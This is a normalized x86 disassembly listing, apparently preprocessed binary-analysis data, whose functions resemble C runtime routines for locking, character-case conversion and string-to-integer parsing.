mov ecx [ ebp + 0x8 ]
push eax
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_446951
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_4486c7
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_446981
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4469a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4469cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4469f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446a1f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_446a48
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
int3
sub_446a95
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
int3
sub_446ae2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
int3
sub_446b2f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
int3
sub_446b5f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_4252f8
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_426f77
int3
sub_446b8f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446bb0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446bd1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446bf2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446c13
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446c6e
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_40355e
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_424fc7
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_424fc7
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_446cb2
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x2
lea ecx [ ebp - 0x4 ]
call sub_44726a
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ eax + 0x8 ]
mov [ ecx * 4 + rw-data ] eax
mov eax [ eax + 0x8 ]
inc [ eax + rw-data ]
lea ecx [ ebp - 0x4 ]
call sub_447292
leave
retn
cmp ecx eax
je r-xdata
mov ecx [ eax + 0x8 ]
inc ecx
mov [ eax + 0x8 ] ecx
cmp ecx 0x8
jb r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
test ecx ecx
je r-xdata
sub_446d07
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_446c6e
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_402f60
push esi
call sub_424fc7
pop ecx
sub_446d85
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_446d70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_446da6
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_446dd0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_402ed7
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_446df1
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_44726a
push rw-data
call sub_446dd0
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_447292
leave
retn
sub_446e23
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_446df1
mov [ rw-data ] 0x1
call sub_447e89
pop ecx
sub_446e4d
push 0x4
mov eax sub_449d73
call sub_448595
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_44726a
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_42578a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_447292
call sub_44866d
retn
mov ecx [ eax ]
call sub_402ed7
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_446ebf
push 0x4
mov eax sub_449d96
call sub_448595
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_44726a
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_446d70
push esi
call sub_424fc7
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_447292
call sub_44866d
retn
sub_446f0d
push 0x4
mov eax sub_449db9
call sub_448595
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_44726a
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_446d70
push esi
call sub_424fc7
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_447292
call sub_44866d
retn
sub_446f5b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_43e204
pop ecx
pop ecx
sub_446f76
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_42578a
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_424f00
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_4247f0
add esp 0xc
sub_446fce
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_43e204
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_446f76
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_43e204
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_446f76
pop esi
pop ebp
retn
sub_44701b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_446f76
mov eax esi
pop esi
pop ebp
retn 0x4
sub_447039
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_446f76
mov eax esi
pop esi
pop ebp
retn 0x4
sub_447078
push 0x4
mov eax sub_449de7
call sub_448595
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_446e4d
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_44866d
retn
push eax
call sub_42578a
pop ecx
sub_4470bb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_447078
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4470dc
push 0x4
mov eax sub_449e0a
call sub_448595
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_44866d
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_44726a
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_447292
push 0x20
call sub_424ff8
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_446e23
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_446f76
mov ecx esi
mov [ rw-data ] esi
call sub_402eaf
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_447039
mov esi eax
sub_447176
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_4470dc
push 0x20
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor eax eax
push 0x1
mov ecx eax
call sub_447039
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn
sub_4471a7
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_447f21
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_4471d8
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_447f31
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_447201
push rw-data
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_447f21
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_44722a
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_447f31
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_44726a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f41
pop ecx
sub_4472b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and eax 0x3
mov [ ecx ] eax
imul eax eax 0x18
add eax rw-data
push eax
call sub_447f41
pop ecx
pop ebp
retn
sub_447329
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_424ff8
push eax
mov [ esi ] eax
call sub_447f21
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_44736c
mov edi edi
push ebp
mov ebp esp
push 0x18
call sub_424ff8
mov ecx [ ebp + 0x8 ]
push eax
mov [ ecx ] eax
call sub_447f21
pop ecx
pop ecx
pop ebp
retn
sub_447387
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_447f31
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
pop esi
pop ebp
retn
sub_4473cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_442adc
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_442a90
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_4338ad
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_437ee4
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_437abf
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_4474d9
mov edi edi
push ebp
mov ebp esp
push esi
call sub_442adc
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_442a90
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_42acf2
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_4338ad
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_4338ad
push eax
push [ esi + 0x8 ]
call sub_4247f0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_447539
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447b60
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_44755b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447bc9
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0xc
leave
retn
sub_44757a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_4380e7
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_447657
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_4268f3
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_447657
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_4380e7
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_43856c
pop ecx
push eax
mov esi r--data
push esi
call sub_4257d0
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_442670
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_43856c
pop ecx
push eax
push esi
call sub_4257d0
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_4268f3
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_4499b0
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_447875
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_442adc
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_442a90
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_4338ad
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_437f63
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_437abf
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_4479aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_4380e7
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_43856c
pop ecx
push eax
mov edi r--data
push edi
call sub_4257d0
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_43856c
pop ecx
push eax
push edi
call sub_4257d0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_4268f3
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
